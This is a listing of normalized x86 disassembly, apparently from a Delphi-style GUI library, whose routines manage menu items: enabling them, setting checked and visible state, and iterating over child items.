cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_44ad38
push eax
call EnableMenuItem
sub_44c748
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_44cb08
mov edx eax
mov ecx ebx
mov eax edi
call sub_44acd8
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_44c634
sub_44c7b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_414098
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_449de0
sub_44c824
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_44c7a4
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_44c80c
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_44cb3c
mov ecx ebx
mov edx esi
mov eax edi
call sub_44c930
sub_44c86c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c7a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44c7b4
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_44c8c4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_44c7a4
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44c7b4
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_44c7b4
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_44c930
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_449de0
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_44acd8
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_414114
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_44cba8
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_44c7a4
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44ac08
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_414098
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_414098
mov dl [ eax + 0x3f ]
mov eax esi
call sub_44c748
sub_44c9e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_449de0
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_44c7a4
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_44ac08
mov eax ebx
call sub_44c7a4
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_414098
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_413f38
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_44ca58
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_44c67c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44c78c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_44c78c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_44cb20
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44c7a4
mov edx eax
mov ecx esi
mov eax ebx
call sub_44c930
pop esi
pop ebx
retn
sub_44cb3c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44cb08
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c9e4
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_449de0
sub_44cb64
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_44cba8
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_44cba8
jmp r-xdata
mov eax ebx
call sub_44ac08
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_44e880
sub_44cc00
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ ebx + 0x4c ] eax
sub_44cc28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403198
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_44cebc
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403394
mov edx ebx
mov eax edi
call sub_419b20
mov eax ebx
mov si 0xffee
call sub_403394
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_44cc98
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_421ee0
mov [ esi + 0x4c ] eax
sub_44cccc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_44c7a4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_44c7b4
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_44cd0c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44cb3c
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_44cb20
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44cb20
sub_44cd70
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_44c634
sub_44cd9c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_44c60c
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_44c67c
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_44c6d0
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_403f3c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_44c7fc
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_44c748
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_44c7d8
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_44c7ec
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_44cebc
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44c78c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_403394
sub_44cee0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cf00
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cf20
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cf40
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cf60
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cf80
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cfa0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cfc0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44cfe0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_44d000
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414738
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_446e50
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_446f88
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_446fe8
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_446ce8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_4470a8
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44d078
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d6c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44c78c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44cc28
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_44d0cc
jmp r-xdata
xor edx edx
mov eax esi
call sub_44ab90
sub_44d0cc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x78 ]
call sub_448564
mov eax ebx
call sub_44d13c
pop esi
pop ebx
retn
mov edx [ ebx + 0x78 ]
call sub_4485a8
mov edx ebx
mov eax [ ebx + 0x7c ]
call sub_419b20
sub_44d114
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44d114
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44a264
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44cba8
mov eax ebx
pop esi
pop ebx
retn
sub_44d150
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_40c6a4
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_404448
sub_44d180
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_403f80
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_44d204
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44d326
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ esi ]
call sub_4041a8
test eax eax
jle r-xdata
test bl bl
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi ]
call sub_4041a8
mov edx eax
sub edx 0x3
inc edx
mov eax [ esi ]
mov ecx 0x3
call sub_404408
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_4042f4
jne r-xdata
inc edi
dec eax
jne r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d32d
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f0c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
call sub_404490
push [ esi ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
mov eax esi
mov edx 0x5
call sub_404268
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov eax [ esi ]
call sub_4041a8
mov ecx eax
sub ecx 0x3
mov eax [ esi ]
mov edx 0x1
call sub_404408
push [ ebp - 0x10 ]
push r-xdata
push r-xdata
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax esi
mov edx 0x6
call sub_404268
jmp r-xdata
mov edx [ esi ]
mov dl [ edx + edi - 0x1 ]
mov ecx [ rw-data ]
and edx 0xff
bt [ ecx ] edx
jae r-xdata
sub_44d364
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x19 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_44d803
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1a ] 0x0
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403f80
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44d7c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0xc ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_44c7a4
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
lea eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_403f80
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d80a
lea eax [ ebp - 0x48 ]
mov edx 0x4
call sub_403f0c
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_403f0c
lea eax [ ebp - 0x18 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
mov eax ebx
call sub_44d9b8
test al al
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x38 ] eax
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_4042f4
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
setg [ ebp - 0x1a ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_44d180
pop ecx
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx 0x1
jmp r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
cmp [ eax + 0x30 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403198
mov eax [ ebp - 0x20 ]
call sub_403198
mov eax [ ebp - 0x14 ]
call sub_403198
mov eax [ ebp - 0xc ]
call sub_403198
retn
inc eax
mov [ ebp - 0x38 ] eax
xor esi esi
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
push ebp
call sub_44d180
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4041a8
cmp ebx eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x3c ]
call sub_44f25c
mov eax [ ebp - 0x3c ]
lea edx [ ebp - 0x2c ]
call sub_407be8
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0x30
mov edx [ ebp - 0x30 ]
call sub_403f3c
inc esi
dec [ ebp - 0x38 ]
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6a4
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x30 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov eax [ ebp - 0x2c ]
call sub_40c6a4
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
push eax
mov edx esi
mov eax ebx
call sub_44c7b4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
jmp r-xdata
lea ecx [ ebp - 0x30 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
dec [ ebp - 0x38 ]
jne r-xdata
inc edi
xor esi esi
lea eax [ ebp - 0x44 ]
push eax
mov ecx 0x1
mov edx ebx
mov eax [ ebp - 0x30 ]
call sub_404408
mov eax [ ebp - 0x44 ]
lea edx [ ebp - 0x2c ]
call sub_407be8
push ebp
mov eax [ ebp - 0x2c ]
call sub_44d150
pop ecx
test al al
je r-xdata
inc ebx
jmp r-xdata
push ebp
mov eax [ ebp - 0x2c ]
call sub_44d150
pop ecx
test al al
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax r-xdata
call sub_40c6a4
test eax eax
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x34 ]
call sub_403f80
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx eax
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x20 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ecx eax
dec ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x70 ]
inc esi
dec edi
jne r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
add eax 0x30
push eax
mov edx esi
mov eax ebx
call sub_44c7b4
mov eax [ eax + 0x30 ]
lea edx [ ebp - 0x40 ]
call sub_44f1c8
mov edx [ ebp - 0x40 ]
pop eax
call sub_403f3c
mov edx esi
mov eax ebx
call sub_44c7b4
push eax
mov edx esi
mov eax ebx
call sub_44c7b4
mov ecx [ eax + 0x30 ]
xor edx edx
mov eax [ ebp - 0x20 ]
mov edi [ eax ]
call [ edi + 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x18 ]
call sub_4041a8
mov edx eax
mov ecx 0x1
mov eax [ ebp - 0x18 ]
call sub_404408
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x30 ]
xor ecx ecx
call sub_44d204
mov eax [ ebp - 0x18 ]
call sub_4041a8
mov edx eax
lea eax [ ebp - 0x18 ]
mov ecx 0x1
call sub_404448
lea edx [ ebp - 0x30 ]
mov ecx ebx
mov eax r-xdata
call sub_404490
lea eax [ ebp - 0x30 ]
mov ecx ebx
mov edx [ ebp - 0x2c ]
call sub_44d204
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
jmp r-xdata
sub_44d860
